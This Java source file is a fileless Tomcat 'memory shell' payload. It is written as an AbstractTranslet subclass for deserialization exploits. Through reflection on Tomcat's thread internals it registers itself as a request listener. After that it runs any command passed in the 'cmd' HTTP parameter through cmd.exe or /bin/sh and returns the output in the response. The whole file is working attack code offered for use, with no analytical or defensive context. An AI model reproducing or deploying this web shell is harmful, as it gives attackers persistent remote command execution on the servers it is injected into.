package test;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.*;
import java.lang.reflect.Field;
import java.util.*;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardHost;

public class TemplatesImplTomcat789ListenerShell extends AbstractTranslet implements ServletRequestListener{
    String serverNameMB;
    
    public TemplatesImplTomcat789ListenerShell() throws Exception {
    	setMB();
    	ThreadGroup group = Thread.currentThread().getThreadGroup();
    	Thread[] threads = (Thread[]) getFieldValue(group, "threads");
    	for(int i = 0; i < threads.length; i++) {
    	    try{
    	        Thread t = threads[i];
    	        if (t == null) continue;
    	        String str = t.getName();
    	        if (str.contains("exec") || !str.contains("http")) continue;
    	        Object obj = getFieldValue(t, "target");
    	        if (!(obj instanceof Runnable)) continue;
    	        obj = getFieldValue(obj, "this$0");
    	        obj = getFieldValue(obj, "handler");
    	        obj = getFieldValue(obj, "proto");
    	        obj = getFieldValue(obj, "adapter");
    	        obj = getFieldValue(obj, "connector");
    	        obj = getFieldValue(obj, "service");
		        try {
		        	obj = getFieldValue(obj, "engine");
		        }catch (Exception e) {
		        	obj = getFieldValue(obj, "container");
		        }
    	        HashMap children = (HashMap) getFieldValue(obj, "children");
                StandardHost standardHost = (StandardHost) children.get(serverNameMB);
                children = (HashMap) getFieldValue(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
				StandardContext standardContext = (StandardContext) children.get("");
				standardContext.addApplicationEventListener(this);
				//Object[] objects = {this};
				//standardContext.setApplicationEventListeners(objects);
				break;
    	    }catch(Exception e){
    	        continue;
    	    }
    	}
    }
    public void requestDestroyed(ServletRequestEvent sre) {
		Request request;
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        try {
            Field requestF = req.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            request = (Request)requestF.get(req);
		} catch (Exception e) {
			request = (Request) req;
		}
        if (req.getParameter("cmd") != null){
            try {
                String cmd = req.getParameter("cmd");
                boolean isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
                String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
   				String output = s.hasNext() ? s.next() : "";
   				request.getResponse().getWriter().write(output);
            }
            catch (Exception e) {}
        }
    }
    private void setMB() throws Exception {
    	boolean flag = false;
    	ThreadGroup group = Thread.currentThread().getThreadGroup();
    	Thread[] threads = (Thread[]) getFieldValue(group, "threads");
    	for(int i = 0; i < threads.length; i++) {
    	    try{
    	    	if (flag)  break;
    	        Thread t = threads[i];
    	        if (t == null) continue;
    	        String str = t.getName();
    	        if (str.contains("exec") || !str.contains("http")) continue;
    	        Object obj = getFieldValue(t, "target");
    	        if (!(obj instanceof Runnable)) continue;
    	        obj = getFieldValue(obj, "this$0");
    	        obj = getFieldValue(obj, "handler");
    	        obj = getFieldValue(obj, "global");
    	        ArrayList<?> processors = (ArrayList<?>) getFieldValue(obj, "processors");
    	        for(int j = 0; j < processors.size(); ++j) {
    	            Object processor = processors.get(j);
    	            Object req = getFieldValue(processor, "req");
    	            Object serverPort = getFieldValue(req, "serverPort");
                    if (serverPort.equals(-1)) continue;
                    if (flag)  break;
    	            serverNameMB = (String) getFieldValue(req, "serverNameMB").toString();
    	            if(serverNameMB != null) {
    	            	flag = true;
    	            }
    	        }
    	    }catch(Exception e){
    	        continue;
    	    }
    	}
		
	}
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
    	try {
    		Field field = obj.getClass().getDeclaredField(fieldName);
    		field.setAccessible(true);
            return field.get(obj);
		} catch (Exception e) {
			return getFieldValue(obj, obj.getClass(), fieldName);
		}
    }
    public static Object getFieldValue(Object obj, Class<?> clazz, String fieldName) throws Exception {
    	Field field;
    	clazz = clazz.getSuperclass();
    	try {
    		field = clazz.getDeclaredField(fieldName);
    		field.setAccessible(true);
            return field.get(obj);
		} catch (Exception e) {
			return getFieldValue(obj, clazz, fieldName);
		}
    }
    public void requestInitialized(ServletRequestEvent sre) {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    

}